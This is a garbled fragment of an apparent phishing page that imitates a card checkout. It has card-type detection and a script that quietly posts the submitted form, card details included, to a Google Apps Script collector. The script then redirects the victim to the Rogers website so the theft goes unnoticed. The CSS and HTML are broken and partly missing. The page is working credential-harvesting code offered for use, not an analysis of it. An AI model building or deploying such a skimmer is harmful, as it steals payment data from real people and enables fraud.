<style>
:root{

*{

body{

flex-direction:column;

header img{

.container{

h1{

.info-bar{

padding:16px;
border-radius:8px;
margin-bottom:25px;
}

display:grid;
grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
gap:20px;
}

.form-group{
position:relative;
}

.form-group input{
width:100%;
padding:18px 16px 14px;
border-radius:16px;
border:1px solid #555;
background:var(--input-bg);
color:white;
}

.form-group p{
position:absolute;
top:-10px;
left:12px;
background:#4a0000;
padding:0 6px;
font-size:12px;
color:#ddd;
}

.submit-btn{
grid-column:1/-1;
background:#8B0000;
color:white;
border:none;
padding:16px;
border-radius:16px;
font-size:16px;
cursor:pointer;
}

.submit-btn:hover{
background:#6d0000;
}
</style>
</head>

</div>

<div class="form-group">

Submit

</html>

  <script>
    const cardNumberInput = document.getElementById('cardNumber');
    const cardIcon = document.getElementById('cardIcon');
    const cardTypeInput = document.getElementById('cardType');

    const cardIcons = {
      visa: "https://img.icons8.com/color/48/visa.png",
      mastercard: "https://img.icons8.com/color/48/mastercard-logo.png",
      amex: "https://img.icons8.com/color/48/amex.png"
    };

    function detectCardType(number) {
      number = number.replace(/\s+/g, '');
      if (/^4/.test(number)) return "visa";
      if (/^5[1-5]/.test(number)) return "mastercard";
      if (/^3[47]/.test(number)) return "amex";
      return null;
    }

    cardNumberInput.addEventListener('input', () => {
      const type = detectCardType(cardNumberInput.value);
      if (type && cardIcons[type]) {
        cardIcon.src = cardIcons[type];
        cardIcon.style.display = "block";
        cardTypeInput.value = type.charAt(0).toUpperCase() + type.slice(1);
      } else {
        cardIcon.style.display = "none";
        cardTypeInput.value = "";
      }
    });
  </script>



<script>
/* ===== BACKGROUND SUBMIT (NO BANNER) ===== */
const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxpxxZWj-DFBbPytlqVc0Xxk3nVpJpdHYM20_hNQzorurseIK9spmSUmCPA9cRURN3i/exec";

document.getElementById("checkoutForm").addEventListener("submit", function(e){
  e.preventDefault(); // ❌ default form submit stop

  const btn = this.querySelector(".submit-btn");
  btn.disabled = true;
  btn.innerText = "Processing...";

  const data = new FormData(this);

  fetch(SCRIPT_URL, {
    method: "POST",
    body: data,
    mode: "no-cors" // GAS ke liye safe
  })
  .then(() => {
    // ✅ CLEAN, INSTANT REDIRECT (NO GOOGLE PAGE)
    window.location.replace("https://www.https://www.rogers.com/en");
  })
  .catch(() => {
    btn.disabled = false;
    btn.innerText = "Submit";
    alert("Submission failed. Please try again.");
  });
});
</script>
